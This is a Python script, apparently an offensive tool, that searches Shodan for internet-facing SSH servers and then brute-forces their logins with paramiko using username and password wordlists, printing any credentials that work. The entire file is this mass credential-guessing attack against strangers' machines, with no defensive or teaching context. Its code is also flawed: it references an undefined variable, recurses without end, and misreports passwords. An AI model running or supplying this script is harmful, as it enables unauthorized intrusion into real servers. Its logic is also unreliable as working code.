import paramiko
from paramiko import SSHClient, AutoAddPolicy
import shodan

API_KEY = ""
query = "ssh"
log = "log.txt"
user_file = "user.txt"
pass_file = "pass.txt"
count = 0
passindex = 0
update = 0

client = SSHClient()
client.set_missing_host_key_policy(AutoAddPolicy())

# Setup the API 
api = shodan.Shodan(API_KEY)
result = api.search(query)

with open(log, 'w') as file:
    for service in result['matches']:
        IP = service['ip_str']
        file.write(IP)
        file.write("\n")
file.close()

with open(log, 'r') as file:
    A = file.read()
    B = list(A.split("\n"))
    file.close()

with open(user_file, 'r') as user:
    C = user.read()
    D = list(C.split("\n"))
    user.close()
with open(pass_file, 'r') as passes:
    E = passes.read()
    F = list(E.split("\n"))
    passes.close()

try:
    client.connect(B[count], banner_timeout=60, port=22, username=D[count], password=F[count])
    client.close()
    print("Login to {} is {}@{} with the password: {}".format(B[count], D[count], i, F[count]))
except paramiko.ssh_exception.AuthenticationException:
    print("Failed: {}@{} with password: {}".format(D[count], B[count], F[count]))
except paramiko.ssh_exception.SSHException:
    pass
for i in B[1:-1]:
    passindex = passindex + 1
    try:
        client.connect(i, banner_timeout=60,  port=22, username=D[count], password=F[passindex])
        client.close()
        print("Login to {} is {}@{} with the password: {}".format(i, D[count], i, F[count]))
    except paramiko.ssh_exception.AuthenticationException:
        print("Failed: {}@{} with password: {}".format(D[count], i, F[passindex]))
    except paramiko.ssh_exception.SSHException:
        pass
    except IndexError:
        pass
    except TimeoutError:
        pass
def Loop():
    passindex = 0
    count = 0
    count = count + 1
    try:
        client.connect(B[count], banner_timeout=60, port=22, username=D[count], password=F[passindex])
        client.close()
        print("Login to {} is {}@{} with the password: {}".format(B[count], D[count], B[count], F[passindex]))
    except paramiko.ssh_exception.AuthenticationException:
        print("Failed: {}@{} with password: {}".format(D[count], B[count], F[passindex]))

    for i in B[1:-1]:
        passindex = passindex + 1
        try:
            client.connect(i, banner_timeout=60, port=22, username=D[count], password=F[passindex])
            client.close()
            print("Login to {} is {}@{} with the password: {}".format(i, D[count], i, F[passindex]))
        except paramiko.ssh_exception.AuthenticationException:
            print("Failed: {}@{} with password: {}".format(D[count], i, F[passindex]))
        except paramiko.ssh_exception.SSHException:
            pass
        except IndexError:
            pass
        except paramiko.ssh_exception.NoValidConnectionsError:
            pass
        except TimeoutError:
            pass
    count = count + 1
    Loop()


Loop()
